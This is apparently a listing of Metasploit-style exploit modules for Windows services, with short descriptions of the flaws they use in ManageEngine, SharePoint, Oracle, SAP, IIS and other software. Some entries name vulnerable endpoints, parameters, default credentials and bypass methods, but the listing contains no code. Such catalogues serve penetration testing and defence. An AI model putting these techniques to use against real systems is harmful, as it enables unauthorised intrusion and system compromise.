This module exploits CVE-2022-28219, which is a pair of vulnerabilities in ManageEngine ADAudit Plus versions before build 7060: a path traversal in the /cewolf endpoint, and a blind XXE in, to upload and execute an executable file.

windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection
ManageEngine ADManager Plus prior to build 7181 is vulnerable to an authenticated command injection due to insufficient validation of user input when performing the ChangePasswordAction function before passing it into a string that is later used as an OS command to execute. By making a POST request to /api/json/admin/saveServerSettings with a params POST parameter containing a JSON array object that has a USERNAME or PASSWORD element containing a carriage return and newline, followed by the command the attacker wishes to execute, an attacker can gain RCE as the user running ADManager Plus, which will typically be the local administrator. Note that the attacker must be authenticated in order to send requests to /api/json/admin/saveServerSettings, so this vulnerability does require authentication to exploit. As this exploit modifies the HTTP proxy settings for the entire server, one cannot use fetch payloads with this exploit, since these will use HTTP connections that will be affected by the change in configuration.

windows/http/manageengine_adselfservice_plus_cve_2021_40539
This module exploits CVE-2021-40539, a REST API authentication bypass vulnerability in ManageEngine ADSelfService Plus, to upload a JAR and execute it as the user running ADSelfService Plus - which is SYSTEM if started as a service.

windows/http/manageengine_adselfservice_plus_cve_2022_28810
This module exploits the "custom script" feature of ADSelfService Plus. The feature was removed in build 6122 as part of the patch for CVE-2022-28810. For purposes of this module, a "custom script" is arbitrary operating system command execution. This module uses an attacker provided "admin" account to insert the malicious payload into the custom script fields. When a user resets their password or unlocks their account, the payload in the custom script will be executed. The payload will be executed as SYSTEM if ADSelfService Plus is installed as a service, which we believe is the normal operational behavior. This is a passive module because user interaction is required to trigger the payload. This module also does not automatically remove the malicious code from the remote target. Use the "TARGET_RESET" operation to remove the malicious custom script when you are done. ADSelfService Plus uses default credentials of "admin":"admin"

windows/http/manageengine_adshacluster_rce
This module exploits a remote code execution vulnerability that exists in Exchange Reporter Plus <= 5310, caused by execution of bcp.exe file inside ADSHACluster servlet

windows/http/manageengine_appmanager_exec
This module exploits command injection vulnerability in the ManageEngine Application Manager product. An unauthenticated user can execute a operating system command under the context of privileged user. Publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials by accessing given system. This endpoint calls a several internal classes and then executes powershell script without validating user supplied parameter when the given system is OfficeSharePointServer.

windows/http/manageengine_apps_mngr
This module logs into the Manage Engine Applications Manager to upload a payload to the file system and a batch script that executes the payload.

windows/http/manageengine_connectionid_write
This module exploits a vulnerability found in ManageEngine Desktop Central 9. When uploading a 7z file, the FileUploadServlet class does not check the user-controlled ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to inject a null bye at the end of the value to create a malicious file with an arbitrary file type, and then place it under a directory that allows server-side scripts to run, which results in remote code execution under the context of SYSTEM. Please note that by default, some ManageEngine Desktop Central versions run on port 8020, but older ones run on port 8040. Also, using this exploit will leave debugging information produced by FileUploadServlet in file rdslog0.txt. This exploit was successfully tested on version 9, build 90109 and build 91084.

windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966
This exploits an unauthenticated remote code execution vulnerability that affects Zoho ManageEngine Endpoint Central and MSP versions 10.1.2228.10 and below (CVE-2022-47966). Due to a dependency to an outdated library (Apache Santuario version 1.4.1), it is possible to execute arbitrary code by providing a crafted `samlResponse` XML to the Endpoint Central SAML endpoint. Note that the target is only vulnerable if it is configured with SAML-based SSO , and the service should be active.

windows/http/manageengine_servicedesk_plus_cve_2021_44077
This module exploits CVE-2021-44077, an unauthenticated remote code execution vulnerability in ManageEngine ServiceDesk Plus, to upload an EXE (msiexec.exe) and execute it as the SYSTEM account. Note that build 11305 is vulnerable to the authentication bypass but not the file upload. The module will check for an exploitable build.

windows/http/maxdb_webdbm_database

windows/http/maxdb_webdbm_get_overflow
This module exploits a stack buffer overflow in the MaxDB WebDBM service. This service is included with many recent versions of the MaxDB and SAPDB products. This particular module is capable of exploiting Windows systems through the use of an SEH frame overwrite. The offset to the SEH frame may change depending on where MaxDB has been installed, this module assumes a web root path with the same length as: C:\Program Files\sdb\programs\web\Documents

windows/http/mcafee_epolicy_source
This is an exploit for the McAfee HTTP Server (NAISERV.exe). McAfee ePolicy Orchestrator 2.5.1 <= 3.5.0 and ProtectionPilot 1.1.0 are known to be vulnerable. By sending a large 'Source' header, the stack can be overwritten. This module is based on the exploit by xbxice and muts. Due to size constraints, this module uses the Egghunter technique.

windows/http/mdaemon_worldclient_form2raw
This module exploits a stack buffer overflow in Alt-N MDaemon SMTP server for versions 6.8.5 and earlier. When WorldClient HTTP server is installed (default), a CGI script is provided to accept html FORM based emails and deliver via MDaemon.exe, by writing the CGI output to the Raw Queue. When X-FromCheck is enabled (also default), the temporary form2raw.cgi data is copied by MDaemon.exe and a stack based overflow occurs when an excessively long From field is specified. The RawQueue is processed every 1 minute by default, to a maximum of 60 minutes. Keep this in mind when choosing payloads or setting WfsDelay... You'll need to wait. Furthermore, this exploit uses a direct memory jump into a nopsled (which isn't very reliable). Once the payload is written into the Raw Queue by Form2Raw, MDaemon will continue to crash/execute the payload until the CGI output is manually deleted from the queue in C:\MDaemon\RawFiles\*.raw.

windows/http/minishare_get_overflow
This is a simple buffer overflow for the minishare web server. This flaw affects all versions prior to 1.4.2. This is a plain stack buffer overflow that requires a "jmp esp" to reach the payload, making this difficult to target many platforms at once. This module has been successfully tested against 1.4.1. Version 1.3.4 and below do not seem to be vulnerable.

windows/http/miniweb_upload_wbem
This module exploits a vulnerability in MiniWeb HTTP server (build 300). The software contains a file upload vulnerability that allows an unauthenticated remote attacker to write arbitrary files to the file system. Code execution can be achieved by first uploading the payload to the remote machine as an exe file, and then upload another mof file, which enables WMI (Management Instrumentation service) to execute the uploaded payload. Please note that this module currently only works for Windows before Vista.

windows/http/moveit_cve_2023_34362
This module exploits an SQL injection vulnerability in the MOVEit Transfer web application that allows an unauthenticated attacker to gain access to MOVEit Transfer’s database.

windows/http/navicopa_get_overflow
This module exploits a stack buffer overflow in NaviCOPA 2.0.1. The vulnerability is caused due to a boundary error within the handling of URL parameters.

windows/http/netdecision_http_bof
This module exploits a vulnerability found in NetDecision's HTTP service (located in C:\Program Files\NetDecision\Bin\HttpSvr.exe). By supplying a long string of data to the URL, an overflow may occur if the data gets handled by HTTP Server's active window. In other words, in order to gain remote code execution, the victim is probably looking at HttpSvr's window.

windows/http/netgear_nms_rce
Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems. The application has multiple vulnerabilities that can allow an unauthenticated remote attacker to execute code as SYSTEM user.

windows/http/novell_messenger_acceptlang
This module exploits a stack buffer overflow in Novell GroupWise Messenger Server v2.0. This flaw is triggered by any HTTP request with an Accept-Language header greater than 16 bytes. To overwrite the return address on the stack, we must first pass a memcpy() operation that uses pointers we supply. Due to the large list of restricted characters and the limitations of the current encoder modules, very few payloads are usable.

windows/http/nowsms
This module exploits a stack buffer overflow in Now SMS/MMS Gateway v2007.06.27. By sending a specially crafted GET request, an attacker may be able to execute arbitrary code.

windows/http/nscp_authenticated_rce

The prepareAudioToPlay method found in voice-servlet can be abused to write a malicious file onto the target machine, and gain remote arbitrary code execution under the context of SYSTEM. Authentication is not required to exploit this vulnerability.

windows/http/oracle_btm_writetofile
This module exploits abuses the FlashTunnelService SOAP web service on Oracle Business Transaction Management 12.1.0.7 to upload arbitrary files, without authentication, using the WriteToFile method. The same method contains a directory traversal vulnerability, which allows to upload the files to arbitrary locations. In order to execute remote code two techniques are provided. If the Oracle app has been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web root. If a new Domain has been used to deploy the Oracle application, the Windows Management Instrumentation service can be used to execute arbitrary code. Both techniques have been successfully tested on default installs of Oracle BTM 12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are provided, but the user can configure the traversal depth using the DEPTH option.

windows/http/oracle_endeca_exec
This module exploits a command injection vulnerability on the Oracle Endeca Server 7.4.0. The vulnerability exists on the createDataStore method from the controlSoapBinding web service. The vulnerable method only exists on the 7.4.0 branch and isn't available on the 7.5.5.1 branch. In addition, the injection has been found to be Windows specific. This module has been tested successfully on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits).

windows/http/oracle_event_processing_upload
This module exploits an arbitrary file upload vulnerability in Oracle Event Processing 11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be abused to upload a malicious file onto an arbitrary location due to a directory traversal flaw, and compromise the server. By default Oracle Event Processing uses a Jetty Application Server without JSP support, which limits the attack to WbemExec. The current WbemExec technique only requires arbitrary write to the file system, but at the moment the module only supports Windows 2003 SP2 or older.

windows/http/osb_uname_jlist
This module exploits an authentication bypass vulnerability in login.php. In conjunction with the authentication bypass issue, the 'jlist' parameter in property_box.php can be used to execute arbitrary system commands. This module was tested against Oracle Secure Backup version 10.3.0.1.0

This module has been tested against the thread safe version of PHP 5.4.2, from "windows.php.net", running with Apache 2.2.22 from "apachelounge.com".

windows/http/plesk_mylittleadmin_viewstate
This module exploits a ViewState .NET deserialization vulnerability in web-based MS SQL Server management tool myLittleAdmin, for version 3.8 and likely older versions, due to hardcoded <machineKey> parameters in the web.config file for ASP.NET. Popular web hosting control panel Plesk offers myLittleAdmin as an optional component that is selected automatically during "full" installation. This exploit caters to the Plesk target, though it should work fine against a standalone myLittleAdmin setup. Successful exploitation results in code execution as the user running myLittleAdmin, which is IUSRPLESK_sqladmin for Plesk and described as the "SQL Admin MSSQL anonymous account." Tested on the latest Plesk Obsidian with optional myLittleAdmin 3.8.

windows/http/plex_unpickle_dict_rce
This module exploits an authenticated Python unsafe pickle.load of a Dict file. An authenticated attacker can create a photo library and add arbitrary files to it. After setting the Windows only Plex variable LocalAppDataPath to the newly created photo library, a file named Dict will be unpickled, which causes an RCE as the user who started Plex. Plex_Token is required, to get it you need to log-in through a web browser, then check the requests to grab the X-Plex-Token header. See info -d for additional details. If an exploit fails, or is cancelled, Dict is left on disk, a new ALBUM_NAME will be required as subsuquent writes will make Dict-1, and not execute.

windows/http/privatewire_gateway
This exploits a buffer overflow in the ADMCREG.EXE used in the PrivateWire Online Registration Facility.

windows/http/prtg_authenticated_rce
Notifications can be created by an authenticated user and can execute scripts when triggered. Due to a poorly validated input on the script name, it is possible to chain it with a user-supplied command allowing command execution under the context of privileged user. The module uses provided credentials to log in to the web interface, then creates and triggers a malicious notification to perform RCE using a Powershell payload. It may require a few tries to get a shell because notifications are queued up on the server. This vulnerability affects versions prior to 18.2.39. See references for more details about the vulnerability allowing RCE.

windows/http/psoproxy91_overflow
This module exploits a buffer overflow in the PSO Proxy v0.91 web server. If a client sends an excessively long string the stack is overwritten.

windows/http/rabidhamster_r4_log
This module exploits a vulnerability found in RabidHamster R4's web server. By supplying a malformed HTTP request, it is possible to trigger a stack-based buffer overflow when generating a log, which may result in arbitrary code execution under the context of the user.

windows/http/rejetto_hfs_exec
Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.

windows/http/sambar6_search_results
This module exploits a buffer overflow found in the /search/results.stm application that comes with Sambar 6. This code is a direct port of Andrew Griffiths's SMUDGE exploit, the only changes made were to the nops and payload. This exploit causes the service to die, whether you provided the correct target or not.

windows/http/sap_configservlet_exec_noauth
This module allows remote code execution via operating system commands through the SAP ConfigServlet without any authentication. This module has been tested successfully with SAP NetWeaver 7.00 and 7.01 on Windows Server 2008 R2.

windows/http/sap_host_control_cmd_exec
This module exploits a command injection vulnerability in the SAPHostControl Service, by sending a specially crafted SOAP request to the management console. In order to deal with the spaces and length limitations, a WebDAV service is created to run an arbitrary payload when accessed as a UNC path. Because of this, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically started by default on Windows XP SP3, but disabled by default on Windows 2003 SP2.

windows/http/sapdb_webtools
This module exploits a stack buffer overflow in SAP DB 7.4 WebTools. By sending an overly long GET request, it may be possible for an attacker to execute arbitrary code.

windows/http/savant_31_overflow
This module exploits a stack buffer overflow in Savant 3.1 Web Server. The service supports a maximum of 10 threads (for a default install). Each exploit attempt generally causes a thread to die whether successful or not. Therefore, in a default configuration, you only have 10 chances. Due to the limited space available for the payload in this exploit module, use of the "ord" payloads is recommended.

windows/http/sepm_auth_bypass_rce
This module exploits three separate vulnerabilities in Symantec Endpoint Protection Manager in order to achieve a remote shell on the box as NT AUTHORITY\SYSTEM. The vulnerabilities include an authentication bypass, a directory traversal and a privilege escalation to get privileged code execution.

windows/http/serviio_checkstreamurl_cmd_exec
This module exploits an unauthenticated remote command execution vulnerability in the console component of Serviio Media Server versions 1.4 to 1.8 on Windows operating systems. The console service (on port 23423 by default) exposes a REST API which which does not require authentication. The 'action' API endpoint does not sufficiently sanitize user-supplied data in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is used in a call to cmd.exe resulting in execution of arbitrary commands. This module has been tested successfully on Serviio Media Server versions 1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.

windows/http/servu_session_cookie
This module exploits a buffer overflow in Rhinosoft Serv-U 9.0.0.5. Sending a specially crafted POST request with an overly long session cookie string, an attacker may be able to execute arbitrary code.

windows/http/sharepoint_data_deserialization
A remotely exploitable vulnerability exists within SharePoint that can be leveraged by a remote authenticated attacker to execute code within the context of the SharePoint application service. The privileges in this execution context are determined by the account that is specified when SharePoint is installed and configured. The vulnerability is related to a failure to validate the source of XML input data, leading to an unsafe deserialization operation that can be triggered from a page that initializes either the ContactLinksSuggestionsMicroView type or a derivative of it. In a default configuration, a Domain User account is sufficient to access SharePoint and exploit this vulnerability.

windows/http/sharepoint_ssi_viewstate
This module exploits a server-side include (SSI) in SharePoint to leak the web.config file and forge a malicious ViewState with the extracted validation key. This exploit is authenticated and requires a user with page creation privileges, which is a standard permission in SharePoint. The web.config file will be stored in loot once retrieved, and the VALIDATION_KEY option can be set to short-circuit the SSI and trigger the ViewState deserialization. Tested against SharePoint 2019 on Windows Server 2016.

windows/http/sharepoint_unsafe_control
The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution when deserialized. Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.

windows/http/sharepoint_workflows_xoml
This module exploits a vulnerability within SharePoint and its .NET backend that allows an attacker to execute commands using specially crafted XOML data sent to SharePoint via the Workflows functionality.

windows/http/shoutcast_format
This module exploits a format string vulnerability in the Nullsoft SHOUTcast server for Windows. The vulnerability is triggered by requesting a file path that contains format string specifiers. This vulnerability was discovered by Tomasz Trojanowski and Damian Put.

windows/http/shttpd_post
This module exploits a stack buffer overflow in SHTTPD <= 1.34. The vulnerability is caused due to a boundary error within the handling of POST requests. Based on an original exploit by skOd but using a different method found by hdm.

windows/http/sitecore_xp_cve_2021_42237
This module exploits a deserialization vulnerability in the Report.ashx page of Sitecore XP 7.5 to 7.5.2, 8.0 to 8.0.7, 8.1 to 8.1.3, and 8.2 to 8.2.7. Versions 7.2.6 and earlier and 9.0 and later are not affected. The vulnerability occurs due to Report.ashx's handler, located in Sitecore.Xdb.Client.dll under the Sitecore.sitecore.shell.ClientBin.Reporting.Report defintion, having a ProcessRequest() handler that calls ProcessReport() with the context of the attacker's request without properly checking if the attacker is authenticated or not. This request then causes ReportDataSerializer.DeserializeQuery() to be called, which will end up calling the DeserializeParameters() function of Sitecore.Analytics.Reporting.ReportDataSerializer, if a "parameters" XML tag is found in the attacker's request. Then for each subelement named "parameter", the code will check that it has a name and if it does, it will call NetDataContractSerializer().ReadObject on it. NetDataContractSerializer is vulnerable to deserialization attacks and can be trivially exploited by using the TypeConfuseDelegate gadget chain. By exploiting this vulnerability, an attacker can gain arbitrary code execution as the user that IIS is running as, aka NT AUTHORITY\NETWORK SERVICE. Users can then use technique 4 of the "getsystem" command to use RPCSS impersonation and get SYSTEM level code execution.

windows/http/smartermail_rce
This module exploits a vulnerability in the SmarterTools SmarterMail software for version numbers <= 16.x or for build numbers < 6985. The vulnerable versions and builds expose three .NET remoting endpoints on port 17001, namely /Servers, /Mail and /Spool. For example, a typical installation of SmarterMail Build 6970 will have the /Servers endpoint exposed to the public at tcp://0.0.0.0:17001/Servers, where serialized .NET commands can be sent through a TCP socket connection. The three endpoints perform deserialization of untrusted data (CVE-2019-7214), allowing an attacker to send arbitrary commands to be deserialized and executed. This module exploits this vulnerability to perform .NET deserialization attacks, allowing remote code execution for any unauthenticated user under the context of the SYSTEM account. Successful exploitation results in full administrative control of the target server under the NT AUTHORITY\SYSTEM account. This vulnerability was patched in Build 6985, where the 17001 port is no longer publicly accessible, although it can be accessible locally at 127.0.0.1:17001. Hence, this would still allow for a privilege escalation vector if the server is compromised as a low-privileged user.

windows/http/solarwinds_fsm_userlogin
This module exploits multiple vulnerabilities found in Solarwinds Firewall Security Manager 6.6.5. The first vulnerability is an authentication bypass via the Change Advisor interface due to a user-controlled session.putValue API in userlogin.jsp, allowing the attacker to set the 'username' attribute before authentication. The second problem is that the settings-new.jsp file will only check the 'username' attribute before authorizing the 'uploadFile' action, which can be exploited and allows the attacker to upload a fake xls host list file to the server, and results in arbitrary code execution under the context of SYSTEM. Depending on the installation, by default the Change Advisor web server is listening on port 48080 for an express install. Otherwise, this service may appear on port 8080. Solarwinds has released a fix for this vulnerability as FSM-v6.6.5-HotFix1.zip, noted in the references for this module.

windows/http/solarwinds_storage_manager_sql
This module exploits a SQL injection found in Solarwinds Storage Manager login interface. It will send a malicious SQL query to create a JSP file under the web root directory, and then let it download and execute our malicious executable under the context of SYSTEM.

windows/http/sonicwall_scrutinizer_sqli
This module exploits a vulnerability found in Dell SonicWall Scrutinizer. While handling the 'q' parameter, the PHP application does not properly filter the user-supplied data, which can be manipulated to inject SQL commands, and then gain remote code execution. Please note that authentication is NOT needed to exploit this vulnerability.

windows/http/ssrs_navcorrector_viewstate
A vulnerability exists within Microsoft's SQL Server Reporting Services which can allow an attacker to craft an HTTP POST request with a serialized object to achieve remote code execution. The vulnerability is due to the fact that the serialized blob is not signed by the server.

windows/http/steamcast_useragent

windows/http/sws_connection_bof
This module exploits a vulnerability in Simple Web Server 2.2 rc2. A remote user can send a long string data in the Connection Header to causes an overflow on the stack when function vsprintf() is used, and gain arbitrary code execution. The module has been tested successfully on Windows 7 SP1 and Windows XP SP3.

windows/http/sybase_easerver
This module exploits a stack buffer overflow in the Sybase EAServer Web Console. The offset to the SEH frame appears to change depending on what version of Java is in use by the remote server, making this exploit somewhat unreliable.

windows/http/syncbreeze_bof
This module exploits a stack-based buffer overflow vulnerability in the web interface of Sync Breeze Enterprise v9.4.28, v10.0.28, and v10.1.16, caused by improper bounds checking of the request in HTTP GET and POST requests sent to the built-in web server. This module has been tested successfully on Windows 7 SP1 x86.

windows/http/sysax_create_folder
This module exploits a stack buffer overflow in the create folder function in Sysax Multi Server 5.64. This issue was fixed in 5.66. In order to trigger the vulnerability valid credentials with the create folder permission must be provided. The HTTP option must be enabled on Sysax too. This module will log into the server, get a SID token, find the root folder, and then proceed to exploit the server. Successful exploits result in SYSTEM access. This exploit works on XP SP3, and Server 2003 SP1-SP2.

windows/http/telerik_rau_deserialization
This module exploits the .NET deserialization vulnerability within the RadAsyncUpload (RAU) component of Telerik UI ASP.NET AJAX that is identified as CVE-2019-18935. In order to do so the module must upload a mixed mode .NET assembly DLL which is then loaded through the deserialization flaw. Uploading the file requires knowledge of the cryptographic keys used by RAU. The default values used by this module are related to CVE-2017-11317, which once patched randomizes these keys. It is also necessary to know the version of Telerik UI ASP.NET that is running. This version number is in the format YYYY.#(.###)? where YYYY is the year of the release (e.g. '2020.3.915').

windows/http/tomcat_cgi_cmdlineargs
This module exploits a vulnerability in Apache Tomcat's CGIServlet component. When the enableCmdLineArguments setting is set to true, a remote user can abuse this to execute system commands, and gain remote code execution.

windows/http/trackercam_phparg_overflow
This module exploits a simple stack buffer overflow in the TrackerCam web server. All current versions of this software are vulnerable to a large number of security issues. This module abuses the directory traversal flaw to gain information about the system and then uses the PHP overflow to execute arbitrary code.

windows/http/trackit_file_upload
This module exploits an arbitrary file upload vulnerability in Numara / BMC Track-It! v8 to v11.X. The application exposes the FileStorageService .NET remoting service on port 9010 (9004 for version 8) which accepts unauthenticated uploads. This can be abused by a malicious user to upload a ASP or ASPX file to the web root leading to arbitrary code execution as NETWORK SERVICE or SYSTEM. This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107, 10.0.0.143, 9.0.30.248 and 8.0.2.51.

windows/http/trendmicro_officescan
This module exploits a stack buffer overflow in Trend Micro OfficeScan cgiChkMasterPwd.exe (running with SYSTEM privileges).

windows/http/trendmicro_officescan_widget_exec
This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a terminal command under the context of the web server user. The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the web server user.

windows/http/ultraminihttp_bof
This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21, allowing remote attackers to execute arbitrary code via a long resource name in an HTTP request. This exploit has to deal with the fact that the application's request handler thread is terminated after 60 seconds by a "monitor" thread. To do this, it allocates some RWX memory, copies the payload to it and creates another thread. When done, it terminates the current thread so that it doesn't crash and hence doesn't bring down the process with it.

windows/http/umbraco_upload_aspx
This module can be used to execute a payload on Umbraco CMS 4.7.0.378. The payload is uploaded as an ASPX script by sending a specially crafted SOAP request to codeEditorSave.asmx, which permits unauthorized file upload via the SaveDLRScript operation. SaveDLRScript is also subject to a path traversal vulnerability, allowing code to be placed into the web-accessible /umbraco/ directory. The module writes, executes and then overwrites an ASPX script; note that though the script content is removed, the file remains on the target. Automatic cleanup of the file is intended if a meterpreter payload is used. This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows 7 32-bit SP1. In this scenario, the "IIS APPPOOL\ASP.NET v4.0" user must have write permissions on the Windows Temp folder.

windows/http/vmware_vcenter_chargeback_upload
This module exploits a code execution flaw in VMware vCenter Chargeback Manager, where the ImageUploadServlet servlet allows unauthenticated file upload. The files are uploaded to the /cbmui/images/ web path, where JSP code execution is allowed. The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1 on Windows 2003 SP2.

windows/http/zentao_pro_rce
This module exploits a command injection vulnerability in ZenTao Pro 8.8.2 and earlier versions in order to execute arbitrary commands with SYSTEM privileges. The module first attempts to authenticate to the ZenTao dashboard. It then tries to execute the payload by submitting fake repositories via the 'Repo Create' function that is accessible from the dashboard via CI>Repo. More precisely, the module sends HTTP POST requests to '/pro/repo-create.html' that inject commands in the vulnerable 'path' parameter which corresponds to the 'Client Path' input field. Valid credentials for a ZenTao admin account are required. This module has been successfully tested against ZenTao 8.8.1 and 8.8.2 running on Windows 10 (XAMPP server).

windows/http/zenworks_assetmgmt_uploadservlet

This module exploits a stack buffer overflow in the IDQ ISAPI handler for Microsoft Index Server.

windows/iis/ms02_018_htr
This exploits a buffer overflow in the ISAPI ISM.DLL used to process HTR scripting in IIS 4.0. This module works against Windows NT 4 Service Packs 3, 4, and 5. The server will continue to process requests until the payload being executed has exited. If you've set EXITFUNC to 'seh', the server will continue processing requests, but you will have trouble terminating a bind shell. If you set EXITFUNC to thread, the server will crash upon exit of the bind shell. The payload is alpha-numerically encoded without a NOP sled because otherwise the data gets mangled by the filters.

windows/iis/ms02_065_msadc
This module can be used to execute arbitrary code on IIS servers that expose the /msadc/msadcs.dll Microsoft Data Access Components (MDAC) Remote Data Service (RDS) DataFactory service. The service is exploitable even when RDS is configured to deny remote connections (handsafe.reg). The service is vulnerable to a heap overflow where the RDS DataStub 'Content-Type' string is overly long. Microsoft Data Access Components (MDAC) 2.1 through 2.6 are known to be vulnerable.

windows/iis/ms03_007_ntdll_webdav
This exploits a buffer overflow in NTDLL.dll on Windows 2000 through the SEARCH WebDAV method in IIS. This particular module only works against Windows 2000. It should have a reasonable chance of success against SP0 to SP3.

windows/iis/msadc
This module can be used to execute arbitrary commands on IIS servers that expose the /msadc/msadcs.dll Microsoft Data Access Components (MDAC) Remote Data Service (RDS) DataFactory service using VbBusObj or AdvancedDataFactory to inject shell commands into Microsoft Access databases (MDBs), MSSQL databases and ODBC/JET Data Source Name (DSN). Based on the msadcs.pl v2 exploit by Rain.Forest.Puppy, which was actively used in the wild in the late Ninties. MDAC versions affected include MDAC 1.5, 2.0, 2.0 SDK, 2.1 and systems with the MDAC Sample Pages for RDS installed, and NT4 Servers with the NT Option Pack installed or upgraded 2000 systems often running IIS3/4/5 however some vulnerable installations can still be found on newer Windows operating systems. Note that newer releases of msadcs.dll can still be abused however by default remote connections to the RDS is denied. Consider using VERBOSE if you're unable to successfully execute a command, as the error messages are detailed and useful for debugging. Also set NAME to obtain the remote hostname, and METHOD to use the alternative VbBusObj technique.

windows/imap/eudora_list
This module exploits a stack buffer overflow in the Qualcomm WorldMail IMAP Server version 3.0 (builds 6.1.19.0 through 6.1.22.0). Version 6.1.22.1 fixes this particular vulnerability.

This exploits a buffer overflow in the LDAP service that is part of the IMail product. This module was tested against version 7.10 and 8.5, both running on Windows 2000.

windows/ldap/pgp_keyserver7
This module exploits a stack buffer overflow in the LDAP service that is part of the NAI PGP Enterprise product suite. This module was tested against PGP KeyServer v7.0. Due to space restrictions, egghunter is used to find our payload - therefore you may wish to adjust WfsDelay.

windows/license/calicclnt_getconfig
This module exploits a vulnerability in the CA License Client service. This exploit will only work if your IP address can be resolved from the target system point of view. This can be accomplished on a local network by running the 'nmbd' service that comes with Samba. If you are running this exploit from Windows and do not filter udp port 137, this should not be a problem (if the target is on the same network segment). Due to the bugginess of the software, you are only allowed one connection to the agent port before it starts ignoring you. If it wasn't for this issue, it would be possible to repeatedly exploit this bug.

windows/license/calicserv_getconfig
This module exploits an vulnerability in the CA License Server network service. By sending an excessively long GETCONFIG packet the stack may be overwritten.

windows/license/flexnet_lmgrd_bof
This module exploits a vulnerability in the FlexNet License Server Manager. The vulnerability is due to the insecure usage of memcpy in the lmgrd service when handling network packets, which results in a stack buffer overflow. In order to improve reliability, this module will make lots of connections to lmgrd during each attempt to maximize its success.

windows/license/sentinel_lm7_udp
This module exploits a simple stack buffer overflow in the Sentinel License Manager. The SentinelLM service is installed with a wide selection of products and seems particular popular with academic products. If the wrong target value is selected, the service will crash and not restart.

windows/local/adobe_sandbox_adobecollabsync
This module exploits a vulnerability on Adobe Reader X Sandbox. The vulnerability is due to a sandbox rule allowing a Low Integrity AcroRd32.exe process to write register values which can be used to trigger a buffer overflow on the AdobeCollabSync component, allowing to achieve Medium Integrity Level privileges from a Low Integrity AcroRd32.exe process. This module has been tested successfully on Adobe Reader X 10.1.4 over Windows 7 SP1.

windows/local/agnitum_outpost_acs
This module exploits a directory traversal vulnerability on Agnitum Outpost Internet Security 8.1. The vulnerability exists in the acs.exe component, allowing the user to load arbitrary DLLs through the acsipc_server named pipe, and finally execute arbitrary code with SYSTEM privileges. This module has been tested successfully on Windows 7 SP1 with Agnitum Outpost Internet Security 8.1 (32 bits and 64 bits versions).

windows/local/alpc_taskscheduler
On vulnerable versions of Windows the alpc endpoint method SchRpcSetSecurity implemented by the task scheduler service can be used to write arbitrary DACLs to `.job` files located in `c:\windows\tasks` because the scheduler does not use impersonation when checking this location. Since users can create files in the `c:\windows\tasks` folder, a hardlink can be created to a file the user has read access to. After creating a hardlink, the vulnerability can be triggered to set the DACL on the linked file. WARNING: The PrintConfig.dll (%windir%\system32\driverstor\filerepository\prnms003*) on the target host will be overwritten when the exploit runs. This module has been tested against Windows 10 Pro x64.

windows/local/always_install_elevated
This module checks the AlwaysInstallElevated registry keys which dictates if .MSI files should be installed with elevated privileges (NT AUTHORITY\SYSTEM). The generated .MSI file has an embedded executable which is extracted and run by the installer. After execution the .MSI file intentionally fails installation (by calling some invalid VBS) to prevent it being registered on the system. By running this with the /quiet argument the error will not be seen by the user.

windows/local/anyconnect_lpe
The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.8.02042 is vulnerable to path traversal and allows local attackers to create/overwrite files in arbitrary locations with system level privileges. The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.9.00086 is vulnerable to a DLL hijacking and allows local attackers to execute code on the affected machine with with system level privileges. Both attacks consist in sending a specially crafted IPC request to the TCP port 62522 on the loopback device, which is exposed by the Cisco AnyConnect Secure Mobility Agent service. This service will then launch the vulnerable installer component (`vpndownloader`), which copies itself to an arbitrary location (CVE-2020-3153) or with a supplied DLL (CVE-2020-3433) before being executed with system privileges. Since `vpndownloader` is also vulnerable to DLL hijacking, a specially crafted DLL (`dbghelp.dll`) is created at the same location `vpndownloader` will be copied to get code execution with system privileges. The CVE-2020-3153 exploit has been successfully tested against Cisco AnyConnect Secure Mobility Client versions 4.5.04029, 4.5.05030 and 4.7.04056 on Windows 10 version 1909 (x64) and Windows 7 SP1 (x86); the CVE-2020-3434 exploit has been successfully tested against Cisco AnyConnect Secure Mobility Client versions 4.5.02036, 4.6.03049, 4.7.04056, 4.8.01090 and 4.8.03052 on Windows 10 version 1909 (x64) and 4.7.4056 on Windows 7 SP1 (x64).

windows/local/applocker_bypass
This module will generate a .NET service executable on the target and utilize InstallUtil to run the payload bypassing the AppLocker protection. Currently only the InstallUtil method is provided, but future methods can be added easily.

windows/local/appxsvc_hard_link_privesc
